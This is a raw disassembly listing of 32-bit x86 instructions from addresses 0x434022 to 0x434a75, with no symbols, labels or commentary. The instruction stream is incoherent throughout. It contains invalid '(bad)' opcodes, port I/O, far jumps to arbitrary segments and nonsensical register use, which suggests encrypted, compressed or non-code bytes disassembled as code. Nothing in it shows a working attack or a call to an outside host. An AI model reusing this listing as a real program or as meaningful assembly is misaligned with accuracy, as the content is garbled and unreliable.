  434022:	push   edi
  434023:	xlat   BYTE PTR ds:[ebx]
  434024:	sbb    esp,DWORD PTR [ecx]
  434026:	fdiv   st,st(1)
  434028:	adc    eax,0x5bb1dbb5
  43402d:	xchg   DWORD PTR [ecx+0x1a],esp
  434030:	mov    ds:0xc727dd21,al
  434035:	xor    BYTE PTR [esi],0x18
  434038:	ins    BYTE PTR es:[edi],dx
  434039:	inc    esp
  43403a:	push   ss
  43403b:	jae    0x434061
  43403d:	and    DWORD PTR [edi+0xd094e27],edi
  434043:	add    BYTE PTR [ebx],bl
  434045:	mov    cs,eax
  434047:	sbb    BYTE PTR [edx],dl
  434049:	mov    ebp,0x3e542d5
  43404e:	cmc    
  43404f:	xor    eax,0x50f620b7
  434054:	call   0xb643499e
  434059:	lods   eax,DWORD PTR ds:[esi]
  43405a:	jmp    0x50c2:0xe2ae2dd2
  434061:	sbb    bh,BYTE PTR [edi+edx*1]
  434064:	cmp    cl,BYTE PTR [esi+0x826bb92]
  43406a:	or     eax,0xc4c59828
  43406f:	pop    ss
  434070:	daa    
  434071:	or     BYTE PTR ds:0xabb1b3,cl
	...
  434093:	add    BYTE PTR [esi+0x3303a893],dh
  434099:	add    bh,dl
  43409b:	cmp    al,0xa6
  43409d:	in     eax,dx
  43409e:	fs hlt 
  4340a0:	(bad)  
  4340a2:	ins    DWORD PTR es:[edi],dx
  4340a3:	sbb    al,0x88
  4340a5:	pop    ss
  4340a6:	add    BYTE PTR [ebp+0x62],bh
  4340a9:	lods   al,BYTE PTR ds:[esi]
  4340aa:	xchg   BYTE PTR [esi+edi*8-0x4b16c011],bh
  4340b1:	popf   
  4340b2:	call   ecx
  4340b4:	jns    0x434067
  4340b6:	cli    
  4340b7:	cld    
  4340b8:	call   0x7440:0x8be93ff0
  4340bf:	out    dx,al
  4340c0:	sahf   
  4340c1:	sbb    dl,BYTE PTR ds:0xffd75e89
  4340c7:	push   ds
  4340c8:	test   BYTE PTR [edx],bl
  4340ca:	aad    0x62
  4340cc:	push   ds
  4340cd:	jge    0x4340c1
  4340cf:	sbb    al,0xe5
  4340d1:	scas   eax,DWORD PTR es:[edi]
  4340d2:	push   edx
  4340d3:	pop    edx
  4340d4:	bndstx ds:0xffd71e71,bnd2
  4340db:	bound  edi,QWORD PTR cs:[edx+0x5559aa85]
  4340e2:	add    al,0xe9
  4340e4:	in     eax,dx
  4340e5:	mov    esp,DWORD PTR [ebx]
  4340e7:	in     eax,dx
  4340e8:	rcr    BYTE PTR [eax+eax*1+0x4f280903],0x63
  4340f0:	sub    eax,0xee5be1b
  4340f5:	sbb    esi,DWORD PTR [ebp+ecx*1+0x0]
	...
  434115:	add    BYTE PTR ds:0xb0e965c6,dl
  43411b:	push   ss
  43411c:	jecxz  0x4340c9
  43411e:	clc    
  43411f:	sbb    bh,bl
  434121:	sub    ecx,DWORD PTR [edx]
  434123:	add    BYTE PTR [ebp+0x62],dl
  434126:	cli    
  434127:	sub    ah,0x9
  43412a:	adc    eax,0x75bf0000
  43412f:	xor    DWORD PTR [ebp-0x4e4eef5],0x62
  434136:	or     BYTE PTR [eax],ch
  434138:	stc    
  434139:	push   edi
  43413a:	in     al,dx
  43413b:	sbb    al,BYTE PTR ds:0x1d600
  434141:	add    BYTE PTR [esi+0xe],bh
  434144:	dec    ebx
  434145:	push   0x74
  434147:	test   DWORD PTR [ebp-0x28],esi
  43414a:	test   edx,0xcf98e8f6
  434150:	idiv   bh
  434152:	jmp    0xef60b712
  434157:	mov    ebp,0xdbec684f
  43415c:	cmp    al,BYTE PTR [eax]
  43415e:	loope  0x4340e8
  434160:	sar    ch,1
  434162:	xchg   ebx,eax
  434163:	test   BYTE PTR [edi-0x18],0xba
  434167:	inc    ebx
  434168:	idiv   bh
  43416a:	test   eax,0x649506bb
  43416f:	xchg   eax,eax
  434171:	jne    0x4341b0
  434173:	xor    DWORD PTR [ebx-0x2f77529a],edi
  434179:	std    
	...
  434196:	add    BYTE PTR [eax],al
  434198:	xchg   ebx,eax
  434199:	idiv   BYTE PTR [eax+0x225ee]
  43419f:	lea    ebp,[ecx-0x7c000d1f]
  4341a5:	mov    esi,0x4334ffff
  4341aa:	je     0x4341a5
  4341ac:	fsubr  QWORD PTR [ebp+0x70e44082]
  4341b2:	test   eax,edx
  4341b4:	inc    ecx
  4341b5:	cmc    
  4341b6:	not    BYTE PTR [eax+0x53]
  4341b9:	pop    ss
  4341ba:	xchg   ebx,eax
  4341bb:	adc    DWORD PTR [ecx+eax*1-0x3238285],esp
  4341c2:	ins    DWORD PTR es:[edi],dx
  4341c3:	and    al,0x2f
  4341c5:	cmp    eax,0x343765ff
  4341ca:	sti    
  4341cb:	jae    0x4341dc
  4341cd:	dec    esp
  4341ce:	not    BYTE PTR ds:0x3b1204
  4341d4:	or     eax,0xa2503f2a
  4341d9:	outs   dx,BYTE PTR ds:[esi]
  4341da:	add    ecx,DWORD PTR [ebp-0x4df0870]
  4341e0:	xchg   edx,eax
  4341e1:	ja     0x43420a
  4341e3:	in     al,0xee
  4341e5:	es jmp esi
  4341e8:	adc    DWORD PTR [eax+ecx*4+0x1a1e78d0],esi
  4341ef:	push   eax
  4341f0:	gs push ecx
  4341f2:	imul   edi,edx,0xc8b9ce6a
  4341f8:	dec    edi
  4341f9:	sbb    edi,edi
  4341fb:	push   esp
	...
  434218:	add    BYTE PTR [eax],al
  43421a:	xchg   BYTE PTR [ebx],ch
  43421c:	jle    0x434202
  43421e:	push   ebp
  43421f:	clc    
  434220:	mov    ah,0x4e
  434222:	jecxz  0x4341bf
  434224:	xchg   edx,eax
  434225:	and    edx,DWORD PTR ds:0xd30ef3f
  43422b:	daa    
  43422c:	xchg   dl,al
  43422e:	and    eax,0x2affd4c2
  434233:	mov    ds:0x7f07743e,eax
  434238:	push   esi
  434239:	sbb    cl,BYTE PTR ds:0x80014e27
  43423f:	jecxz  0x434228
  434241:	pop    es
  434242:	cmc    
  434243:	inc    esp
  434244:	aam    0xff
  434246:	add    al,BYTE PTR ds:0x9256bf86
  43424c:	daa    
  43424d:	pop    ebp
  43424e:	iret   
  43424f:	sbb    bh,bh
  434251:	sub    eax,0xe82bc1c6
  434256:	xor    esi,DWORD PTR [esi]
  434258:	(bad)  
  434259:	call   FWORD PTR [ebp+0xd044127]
  43425f:	scas   eax,DWORD PTR es:[edi]
  434260:	jne    0x43426d
  434262:	or     eax,0xcf014f27
  434267:	sbb    bh,bh
  434269:	cs int 0xff
  43426c:	test   al,0xa5
  43426e:	add    eax,0xd0726ff
  434273:	sahf   
  434274:	gs or  al,0xa3
  434277:	fs call 0x9c4353be
  43427d:	mov    al,BYTE PTR [eax]
	...
  43429b:	add    BYTE PTR [ecx-0x23e4fa80],ah
  4342a1:	xor    BYTE PTR [ebx+ecx*1+0xc],0xb1
  4342a6:	xchg   edx,eax
  4342a7:	mov    dh,0x93
  4342a9:	cmp    DWORD PTR [esi+0x13],ebp
  4342ac:	(bad)  
  4342ad:	sti    
  4342ae:	push   ss
  4342af:	inc    esp
  4342b0:	jb     0x434274
  4342b2:	gs sahf 
  4342b4:	push   cs
  4342b5:	add    BYTE PTR [esp+eiz*8-0xe],dl
  4342b9:	pop    edi
  4342ba:	jmp    0x826b4fc2
  4342bf:	pop    es
  4342c0:	or     eax,0xb9446c00
  4342c5:	push   es
  4342c6:	pop    esi
  4342c7:	sbb    al,0x25
  4342c9:	in     eax,0x5f
  4342cb:	sbb    eax,0xd0e72836
  4342d0:	push   0xffffff86
  4342d2:	sub    ecx,DWORD PTR [eax]
  4342d4:	mov    BYTE PTR [edi],bh
  4342d6:	adc    eax,0xec959236
  4342db:	sub    esi,ebp
  4342dd:	pop    ecx
  4342de:	jp     0x4342fd
  4342e0:	xchg   ecx,eax
  4342e1:	inc    eax
  4342e2:	std    
  4342e3:	dec    ecx
  4342e4:	xor    dl,BYTE PTR [ebx]
  4342e6:	and    bl,bl
  4342e8:	jns    0x4342f2
  4342ea:	fcomi  st,st(2)
  4342ec:	test   esp,0xfc5f1d9d
  4342f2:	inc    eax
  4342f3:	jno    0x434290
  4342f5:	adc    ecx,DWORD PTR [edx-0x3b]
  4342f8:	and    edx,DWORD PTR [ebp+0x50e791f0]
  4342fe:	call   0x4343bf
	...
  43431b:	add    BYTE PTR [eax],al
  43431d:	add    BYTE PTR [edi+esi*4-0x1],ah
  434321:	popa   
  434322:	jmp    0x86ad:0xee5bdb4
  434329:	adc    eax,0xeb08248e
  43432e:	push   cs
  43432f:	add    BYTE PTR [edi+0x62],cl
  434332:	out    0x7a,al
  434334:	aas    
  434335:	in     eax,0x60
  434337:	jl     0x4342f9
  434339:	test   BYTE PTR [edx+0xee9006d],0x7b
  434340:	push   eax
  434341:	in     eax,0x5d
  434343:	dec    eax
  434344:	test   DWORD PTR [ebx],ebx
  434346:	or     BYTE PTR [eax+ecx*4-0x17],bh
  43434a:	push   cs
  43434b:	add    BYTE PTR [edi+0x307b1929],al
  434351:	jmp    0xba12:0xa97efb50
  434358:	je     0x434316
  43435a:	mov    ecx,DWORD PTR [ecx+0x74]
  43435d:	aaa    
  43435e:	ja     0x43434b
  434360:	out    0xa,eax
  434362:	or     al,BYTE PTR [eax]
  434364:	add    BYTE PTR [esi+ecx*8-0x75],ah
  434368:	push   ds
  434369:	jb     0x4343b0
  43436b:	inc    edx
  43436d:	jmp    0xe983be8c
  434372:	lea    esp,[eax-0x5f7216f5]
  434378:	psubsw mm1,mm1
  43437b:	mov    edi,0xbf95e107
  434380:	jmp    FWORD PTR [esi+0x0]
	...
  43439e:	add    BYTE PTR [eax],al
  4343a0:	into   
  4343a1:	out    dx,al
  4343a2:	add    BYTE PTR [eax-0x3a],ah
  4343a5:	inc    BYTE PTR [esi+0x2e122559]
  4343ab:	push   edi
  4343ac:	xchg   ebx,eax
  4343ad:	or     eax,0x7c93ab74
  4343b2:	clc    
  4343b3:	dec    esp
  4343b4:	stc    
  4343b5:	push   ss
  4343b6:	push   eax
  4343b7:	add    BYTE PTR [esi+0x71a7e7f9],bh
  4343bd:	repz test BYTE PTR [esp+esi*8+0x59570b6a],0x7a
  4343c6:	clc    
  4343c7:	std    
  4343c8:	jmp    0x4343bd
  4343ca:	dec    edi
  4343cb:	mov    ecx,DWORD PTR [edx]
  4343cd:	out    0xeb,eax
  4343cf:	(bad)  
  4343d1:	repz push esi
  4343d3:	add    DWORD PTR [edi-0x8180006],0x43
  4343da:	stc    
  4343db:	push   ecx
  4343dd:	mov    esi,0xf3a40b73
  4343e2:	adc    al,0x4
  4343e4:	push   edi
  4343e5:	ds sti 
  4343e7:	scas   eax,DWORD PTR es:[edi]
  4343e8:	gs loope 0x4343ec
  4343eb:	mov    esi,DWORD PTR [edx+0x64]
  4343ee:	add    BYTE PTR [ebx+0x320ff6aa],cl
  4343f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4343f5:	push   ebp
  4343f6:	push   edx
  4343f7:	leave  
  4343f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4343f9:	(bad)  
  4343fa:	jmp    DWORD PTR [ebp-0x49]
  4343fd:	add    al,0x10
  4343ff:	mov    al,0x35
  434401:	mov    esp,0x3
	...
  434422:	sar    BYTE PTR [edx+0x9],cl
  434425:	add    al,0xd4
  434427:	cld    
  434428:	mov    ecx,0x824f3404
  43442d:	in     al,dx
  43442e:	mov    ch,0xe7
  434430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434431:	add    ah,BYTE PTR [esi+edi*8]
  434434:	dec    edx
  434435:	push   esi
  434436:	lahf   
  434437:	jmp    0x4343bb
  434439:	inc    ebp
  43443a:	clc    
  43443b:	jp     0x434445
  43443d:	jmp    DWORD PTR [ebx]
  43443f:	add    esi,0xf6c8b0e8
  434445:	(bad)  
  434446:	jns    0x43448c
  434448:	test   BYTE PTR [ecx-0x50a93],0xd
  43444f:	daa    
  434450:	push   es
  434451:	add    ebx,0x28
  434454:	(bad)  
  434455:	dec    DWORD PTR [esi-0x71ffecbc]
  43445b:	cmp    al,0xb
  43445d:	add    BYTE PTR [eax-0x1c793ed5],dl
  434463:	push   cs
  434464:	adc    cl,BYTE PTR [ebx]
  434466:	(bad)  
  434467:	xchg   ecx,eax
  434468:	add    eax,DWORD PTR [eax]
  43446a:	or     eax,0x48893f36
  43446f:	out    dx,eax
  434470:	fadd   QWORD PTR [ecx+ebx*4+0x32]
  434474:	sbb    DWORD PTR [esi-0x3d00d8f4],0x416d0
  43447e:	or     eax,0x65458c27
  434483:	jns    0x434407
  434485:	jge    0x434487
	...
  4344a3:	add    BYTE PTR [ebp+0x27],dh
  4344a6:	push   es
  4344a7:	test   DWORD PTR [eax-0x690000d8],ebx
  4344ad:	in     al,0x2b
  4344af:	xchg   eax,ecx
  4344b1:	sub    cl,BYTE PTR [edx+0x488e0534]
  4344b7:	call   0xfb59a774
  4344bc:	mov    BYTE PTR [edi+0x6],ah
  4344bf:	mov    dl,ch
  4344c1:	daa    
  4344c2:	(bad)  
  4344c3:	inc    DWORD PTR [esi+0x3955884f]
  4344c9:	mov    es,WORD PTR [eax-0x18]
  4344cc:	adc    al,0x77
  4344ce:	push   ss
  4344cf:	sti    
  4344d0:	xchg   BYTE PTR [edi-0x7e],cl
  4344d3:	not    DWORD PTR [edx]
  4344d5:	or     bh,BYTE PTR [ebx+0x53]
  4344d8:	or     al,0x27
  4344da:	inc    DWORD PTR [esi+eiz*8+0xc2b7b19]
  4344e1:	daa    
  4344e2:	jmp    FWORD PTR [esi]
  4344e4:	repnz push ecx
  4344e7:	push   edx
  4344e8:	into   
  4344e9:	cdq    
  4344ea:	ins    DWORD PTR es:[edi],dx
  4344eb:	dec    ecx
  4344ed:	(bad)  
  4344ee:	mov    eax,0x9483dac3
  4344f3:	mov    ebx,0x2b4210d1
  4344f8:	pop    esi
  4344f9:	xchg   BYTE PTR [edx],bh
  4344fb:	sbb    cl,BYTE PTR [edx-0x596fa1c7]
  434501:	test   bl,bl
  434503:	mov    bl,0xaa
  434505:	sahf   
  434506:	test   al,0x3
	...
  434524:	add    BYTE PTR [eax],al
  434526:	or     eax,0x890a297b
  43452b:	cmp    ebp,ecx
  43452d:	add    ecx,DWORD PTR ds:0x968682b9
  434533:	jmp    0x1eb78eae
  434538:	jmp    0x9cc85240
  43453d:	sbb    eax,DWORD PTR [edx+ebp*4-0x2b4c7204]
  434544:	mov    ch,0x95
  434546:	inc    BYTE PTR [eax]
  434548:	xchg   edx,eax
  434549:	or     al,0xe2
  43454b:	push   ss
  43454c:	fisttp WORD PTR [edi+0x7d07d06]
  434552:	fprem  
  434554:	gs inc esp
  434556:	dec    ebx
  434557:	aad    0xa5
  434559:	xchg   esi,eax
  43455a:	test   BYTE PTR ss:[ecx-0x55d1bf13],dh
  434561:	fnsave [ebx-0x75]
  434564:	add    BYTE PTR [edi+0x4cddfdd5],al
  43456a:	mov    dl,0x1
  43456c:	or     eax,DWORD PTR [ebp+0xc1402d5]
  434572:	scas   eax,DWORD PTR es:[edi]
  434573:	jl     0x434535
  434575:	or     eax,0x436e0280
  43457a:	add    BYTE PTR [eax+0x0],0xeb
  43457e:	mov    DWORD PTR [ebp+0x7d055cfb],edi
  434584:	add    al,0xe9
  434586:	push   cs
  434587:	add    BYTE PTR [ebp+0xd4],cl
	...
  4345a5:	add    BYTE PTR [eax],al
  4345a7:	add    BYTE PTR [edx],dl
  4345a9:	jns    0x4345f0
  4345ab:	push   ecx
  4345ac:	sub    DWORD PTR [ebx],edi
  4345ae:	(bad)  
  4345af:	call   0xbe03c9c2
  4345b4:	jle    0x43453a
  4345b6:	sti    
  4345b7:	mov    ch,0xbd
  4345b9:	or     dh,BYTE PTR [ebp+0x45]
  4345bc:	mov    BYTE PTR [ebx-0x18],al
  4345bf:	in     eax,dx
  4345c0:	loope  0x4345cc
  4345c2:	sti    
  4345c3:	jb     0x434597
  4345c5:	adc    eax,DWORD PTR [edi+0x478fab4]
  4345cb:	js     0x4345e7
  4345cd:	inc    eax
  4345ce:	je     0x4345a4
  4345d0:	add    ebp,0x135272fb
  4345d6:	(bad)  
  4345d7:	in     eax,0x8f
  4345d9:	(bad)  
  4345da:	aaa    
  4345db:	jmp    0xb9ca486a
  4345e0:	es shr ebx,cl
  4345e3:	out    0x5,al
  4345e5:	or     eax,DWORD PTR [ebp-0x23]
  4345e8:	inc    edi
  4345e9:	lods   al,BYTE PTR ds:[esi]
  4345ea:	mul    esi
  4345ec:	nop
  4345ed:	cdq    
  4345ee:	cli    
  4345ef:	into   
  4345f0:	cmc    
  4345f1:	mov    ?,WORD PTR [ebp+eax*8+0x25]
  4345f5:	sti    
  4345f6:	test   BYTE PTR [ebp+0x71fb0b24],ch
  4345fc:	test   DWORD PTR [eax],eax
  4345fe:	add    cl,ch
  434600:	out    0x77,eax
  434602:	add    cl,ch
  434604:	push   cs
  434605:	xchg   DWORD PTR [ebp-0x63],eax
  434608:	mov    ecx,DWORD PTR [ebp+0x81f3]
	...
  43462a:	inc    esp
  43462b:	push   cs
  43462c:	sti    
  43462d:	jmp    0x4e5f13
  434632:	dec    ebx
  434633:	rol    BYTE PTR [edx+0x4b7ea904],0x40
  43463a:	in     al,0x8d
  43463c:	mov    edi,0x4d7bdf74
  434641:	or     BYTE PTR [edi+0x24ffce7b],ah
  434647:	(bad)  
  434648:	mov    edi,0x457bf375
  43464d:	lock outs dx,DWORD PTR ds:[esi]
  43464f:	inc    esi
  434650:	pop    es
  434651:	(bad)  
  434652:	jns    0x43463e
  434654:	mov    al,BYTE PTR [eax]
  434656:	mov    ah,0x2
  434658:	mov    DWORD PTR [ecx],eax
  43465a:	retf   0xf783
  43465d:	push   ss
  43465e:	jns    0x434657
  434660:	add    BYTE PTR [ebp+0x4],0x7c
  434664:	dec    ebp
  434665:	or     al,0xeb
  434667:	dec    ebp
  434668:	repz xchg esp,eax
  43466a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43466b:	add    al,BYTE PTR [eax]
  43466d:	mov    DWORD PTR [ebp-0x138285],esp
  434673:	ret    
  434674:	out    0x4,eax
  434676:	ja     0x43467a
  434678:	add    BYTE PTR [ebx-0xfc2557],al
  43467e:	test   eax,0x444582f2
  434683:	cmp    esi,DWORD PTR [edx]
  434685:	inc    ebp
  434686:	inc    eax
  434687:	push   es
  434688:	jp     0x4346fb
  43468a:	inc    edx
  43468b:	div    dh
  43468d:	jmp    0x43468f
	...
  4346ab:	add    BYTE PTR [ebx-0x33],ch
  4346ae:	inc    esp
  4346af:	clc    
  4346b0:	ret    
  4346b1:	add    eax,DWORD PTR [eax]
  4346b3:	add    BYTE PTR [edi+0x18bf740],bh
  4346b9:	lock out 0xdc,eax
  4346bc:	add    al,BYTE PTR es:[eax]
  4346bf:	data16 lahf 
  4346c1:	inc    eax
  4346c2:	repz jmp 0x4346ee
  4346c5:	stos   BYTE PTR es:[edi],al
  4346c6:	nop
  4346c7:	add    BYTE PTR ds:0xb35aff19,cl
  4346cd:	ror    DWORD PTR [esi+edi*4+0x15],1
  4346d1:	pop    ss
  4346d2:	mov    al,0x86
  4346d4:	icebp  
  4346d5:	call   0x86aa:0xed5e4827
  4346dc:	cmp    bl,ch
  4346de:	jmp    0x442d5422
  4346e3:	ret    0xd348
  4346e6:	add    ecx,DWORD PTR [ebp-0x589933a8]
  4346ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4346ed:	sbb    BYTE PTR [edx+0x122737a6],0x75
  4346f4:	adc    eax,0xe1458971
  4346f9:	addr16 adc dl,dl
  4346fc:	mov    es,WORD PTR [ebx+eiz*1+0x0]
  434700:	mov    ds,ebx
  434702:	pop    es
  434703:	lea    ecx,[eax-0x5]
  434706:	mov    bl,0xe7
  434708:	cld    
  434709:	sub    BYTE PTR ds:0x90d789fb,dl
  43470f:	or     eax,0x0
	...
  43472c:	add    BYTE PTR [eax],al
  43472e:	cwde   
  43472f:	mov    WORD PTR [edx],fs
  434731:	call   0xfb588fae
  434736:	mov    ch,0xa9
  434738:	add    eax,DWORD PTR [eax]
  43473a:	or     eax,0xd017100
  43473f:	pop    ss
  434740:	mov    BYTE PTR [ebp+0x39],al
  434743:	(bad)  
  434744:	sub    eax,DWORD PTR [edi]
  434746:	adc    eax,0x4d841235
  43474b:	mov    bl,0xed
  43474d:	mov    eax,es
  43474f:	xor    ah,BYTE PTR [edi]
  434751:	sar    ah,cl
  434753:	dec    esp
  434754:	adc    bh,BYTE PTR [eax-0xe863]
  43475a:	and    al,0xd5
  43475c:	add    al,0x0
  43475e:	or     eax,0x32a06600
  434763:	add    BYTE PTR [eax+eax*8+0x2a],ch
  434767:	mov    al,0x80
  434769:	inc    esi
  43476a:	fmul   QWORD PTR ds:0x92cd7f8a
  434770:	xrelease mov BYTE PTR [eax+0x10],bh
  434774:	xchg   ecx,eax
  434775:	push   edx
  434776:	cmp    al,0xe
  434778:	jb     0x4347a6
  43477a:	ss (bad) 
  43477c:	call   0x7437ba84
  434781:	sar    BYTE PTR [esi-0x653f9451],0xaf
  434788:	push   ecx
  434789:	sub    eax,0x2bdd4452
  43478e:	retf   
  43478f:	shr    al,0x3
	...
  4347ae:	add    BYTE PTR [eax],al
  4347b0:	xchg   esp,eax
  4347b1:	ret    0x887c
  4347b4:	push   eax
  4347b5:	adc    al,0x99
  4347b7:	stos   DWORD PTR es:[edi],eax
  4347b8:	lahf   
  4347b9:	(bad)  
  4347ba:	call   0xd658fcc2
  4347bf:	adc    eax,0x8c1978a6
  4347c4:	and    BYTE PTR [eax],bl
  4347c6:	ins    BYTE PTR es:[edi],dx
  4347c7:	or     eax,0x3228406
  4347cc:	or     eax,0x7eb86e00
  4347d1:	cdq    
  4347d2:	loopne 0x4347a6
  4347d4:	dec    eax
  4347d5:	js     0x4347fd
  4347d7:	mov    esp,0x31640e7f
  4347dc:	push   ss
  4347dd:	adc    DWORD PTR [esi-0x19fff2fc],0x35
  4347e4:	test   DWORD PTR [edx-0x37a87723],esi
  4347ea:	aad    0x5
  4347ec:	retf   0xe97e
  4347ef:	add    ecx,DWORD PTR ds:0x85fc237b
  4347f5:	ret    0xb0ff
  4347f8:	mov    DWORD PTR [edx-0x156416fa],ecx
  4347fe:	gs std 
  434800:	mov    eax,edx
  434802:	sar    DWORD PTR [ecx],cl
  434804:	xchg   edx,eax
  434805:	rol    BYTE PTR [ebx],0x39
  434808:	clc    
  434809:	repnz push edi
  43480b:	test   esi,0x15ad7e0b
  434811:	test   eax,eax
  434813:	hlt    
	...
  434830:	add    BYTE PTR [eax],al
  434832:	add    eax,0x86354583
  434837:	inc    ecx
  434839:	and    al,0x14
  43483b:	add    edi,esp
  43483d:	stos   DWORD PTR es:[edi],eax
  43483e:	xchg   ebp,eax
  43483f:	push   DWORD PTR [esi]
  434841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434842:	inc    edx
  434843:	(bad)  
  434844:	or     al,0x62
  434846:	retf   0x2747
  434849:	and    DWORD PTR [esi+0x16038009],ecx
  43484f:	add    BYTE PTR [edx+0xf],dh
  434852:	(bad)  
  434853:	lods   al,BYTE PTR ds:[esi]
  434854:	idiv   DWORD PTR [edx+0x2bf82ba]
  43485a:	push   0x13
  43485c:	add    WORD PTR [esi+0x68],sp
  434860:	repz and BYTE PTR [ebx+ecx*2+0x18],ah
  434865:	mov    ecx,0xb6f794f9
  43486a:	and    ebp,esi
  43486c:	dec    ebx
  43486d:	fisttp WORD PTR [esi+0xb]
  434870:	jle    0x434897
  434872:	add    eax,0x679117a2
  434877:	(bad)  
  434878:	repz ret 0xe326
  43487c:	not    DWORD PTR [eax]
  43487e:	mov    ds:0xf9247f13,al
  434883:	out    0x7e,eax
  434885:	scas   al,BYTE PTR es:[edi]
  434886:	push   esi
  434887:	shl    dh,cl
  434889:	pop    ebx
  43488a:	xchg   esp,eax
  43488b:	cmp    BYTE PTR [ebp+0x0],0x3f
  43488f:	push   DWORD PTR [edi+eax*2-0x57]
  434893:	dec    ecx
  434894:	mov    bh,0x50
	...
  4348b2:	add    BYTE PTR [eax],al
  4348b4:	into   
  4348b5:	or     edx,DWORD PTR [edx-0x73]
  4348b8:	stc    
  4348b9:	out    dx,eax
  4348ba:	mov    WORD PTR [ebp+0x7c],es
  4348bd:	xlat   BYTE PTR ds:[ebx]
  4348be:	mov    BYTE PTR [ecx],0x24
  4348c1:	inc    DWORD PTR [eax+eax*8+0x75f621f1]
  4348c8:	mov    esi,ss
  4348ca:	sub    al,0x1
  4348cc:	hlt    
  4348cd:	(bad)  
  4348ce:	call   0xf737c3cd
  4348d3:	push   esi
  4348d4:	mov    WORD PTR [eax],fs
  4348d6:	add    BYTE PTR [eax],al
  4348d8:	hlt    
  4348d9:	pop    eax
  4348da:	adc    ebx,DWORD PTR [eax-0x5c]
  4348dd:	jne    0x434924
  4348df:	hlt    
  4348e0:	imul   ecx,DWORD PTR [edx-0x49],0x17f4c50
  4348e7:	add    BYTE PTR [edi+esi*2+0x7a0285f0],dh
  4348ee:	add    ebp,ecx
  4348f0:	in     eax,dx
  4348f1:	hlt    
  4348f2:	idiv   bh
  4348f4:	das    
  4348f5:	jp     0x4348da
  4348f7:	mov    esi,DWORD PTR [ecx-0x6]
  4348fa:	dec    ebp
  4348fb:	push   0xffffff23
  434900:	cld    
  434901:	mov    esp,0x5cfbfe30
  434906:	test   eax,ebx
  434908:	or     al,0xe5
  43490a:	(bad)  
  43490b:	push   DWORD PTR [ecx+eax*4+0x75]
  43490f:	lock sbb al,0x70
  434912:	sub    edi,esi
  434914:	jnp    0x43489f
  434916:	shl    BYTE PTR [ebp+0x0],cl
	...
  434935:	add    BYTE PTR [ebx-0x7f],cl
  434938:	jne    0x434926
  43493a:	cmp    al,0x56
  43493c:	sub    edi,esi
  43493e:	cmp    edi,DWORD PTR [ebx+0x190d0086]
  434944:	jmp    esi
  434946:	pop    ss
  434947:	lods   al,BYTE PTR ds:[esi]
  434948:	cwde   
  434949:	jmp    0x434980
  43494b:	loopne 0x434920
  43494d:	stc    
  43494e:	cmp    al,BYTE PTR ds:0xedd35b3f
  434954:	cmp    al,0xbe
  434956:	adc    DWORD PTR [ecx],ebx
  434958:	mov    cl,cl
  43495a:	cwde   
  43495b:	adc    al,0xe
  43495d:	xor    ah,BYTE PTR ds:0xd0003b1
  434963:	xchg   esi,eax
  434964:	in     eax,0xff
  434966:	mul    DWORD PTR ds:0x588e027a
  43496c:	or     BYTE PTR [ecx-0x70],dl
  43496f:	push   edi
  434970:	cdq    
  434971:	packuswb mm3,QWORD PTR [edi]
  434974:	push   cs
  434975:	xor    eax,0xffc371c5
  43497a:	jecxz  0x434988
  43497c:	jecxz  0x43498e
  43497e:	dec    ebp
  43497f:	pop    ss
  434980:	sbb    cl,BYTE PTR [ebx]
  434982:	cmp    eax,0xfaf73d
  434987:	iret   
  434988:	xor    eax,0xf8c20d3f
  43498d:	fwait
  43498e:	sbb    al,0x57
  434990:	inc    DWORD PTR [ebp+ecx*8-0x32d1fdb4]
  434997:	(bad)  
  434998:	jl     0x43499c
	...
  4349b6:	add    BYTE PTR [eax],al
  4349b8:	pop    ebp
  4349b9:	sbb    BYTE PTR [edx+0x7f],al
  4349bc:	sbb    DWORD PTR [ebx+0x3],eax
  4349bf:	add    BYTE PTR [eax],bl
  4349c1:	and    ecx,DWORD PTR [esi]
  4349c3:	xor    dh,BYTE PTR [ebp-0x76]
  4349c6:	(bad)  
  4349c7:	dec    DWORD PTR ds:0x67ffe596
  4349cd:	inc    ebp
  4349ce:	jp     0x4349d2
  4349d0:	jb     0x43495d
  4349d2:	loop   0x4349d7
  4349d4:	nop
  4349d5:	xlat   BYTE PTR ds:[ebx]
  4349d6:	cwde   
  4349d7:	or     bh,BYTE PTR [ebp+0x42d8e1ff]
  4349dd:	xor    ah,BYTE PTR [esi]
  4349df:	add    al,0x56
  4349e1:	repz or al,0xf5
  4349e4:	or     al,BYTE PTR [eax]
  4349e6:	mov    esi,0xe895dd02
  4349eb:	adc    al,BYTE PTR [eax]
  4349ed:	sub    BYTE PTR [ebx-0x23f5cd3a],dl
  4349f3:	outs   dx,DWORD PTR ds:[esi]
  4349f4:	cld    
  4349f5:	mov    edi,0x934d88e8
  4349fa:	in     al,dx
  4349fb:	aad    0x5a
  4349fd:	adc    eax,0x500f7ce5
  434a02:	call   0x66435b4c
  434a07:	inc    ebx
  434a08:	or     DWORD PTR [eax-0x2d0803f2],esi
  434a0e:	mov    al,ds:0x72003239
  434a13:	clc    
  434a14:	cs out dx,eax
  434a16:	sub    BYTE PTR [edx+eiz*4],al
  434a19:	jl     0x434a00
  434a1b:	out    0x0,eax
	...
  434a39:	add    BYTE PTR [esi],cl
  434a3b:	add    ah,dl
  434a3d:	pop    es
  434a3e:	and    al,BYTE PTR [eax+0x3e]
  434a41:	cmc    
  434a42:	(bad)  
  434a43:	xchg   ebx,eax
  434a44:	add    al,0x8
  434a46:	sub    eax,DWORD PTR [eax]
  434a48:	inc    edx
  434a49:	fsub   st,st(2)
  434a4b:	xor    DWORD PTR [esi+0xcf2b603],esp
  434a51:	cmc    
  434a52:	jmp    0xa57d:0xd0726ff
  434a59:	out    0xe,eax
  434a5b:	add    BYTE PTR [ebp-0x336c680b],dl
  434a61:	pop    es
  434a62:	repz dec DWORD PTR [ecx]
  434a65:	fcomp  DWORD PTR [edx+0x31]
  434a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434a69:	add    esi,DWORD PTR [esi-0xe]
  434a6c:	shl    ah,1
  434a6e:	xor    al,BYTE PTR [eax]
  434a70:	add    BYTE PTR [ebx],ch
  434a72:	adc    al,BYTE PTR [eax]
  434a74:	push   edx
  434a75:	(bad)  
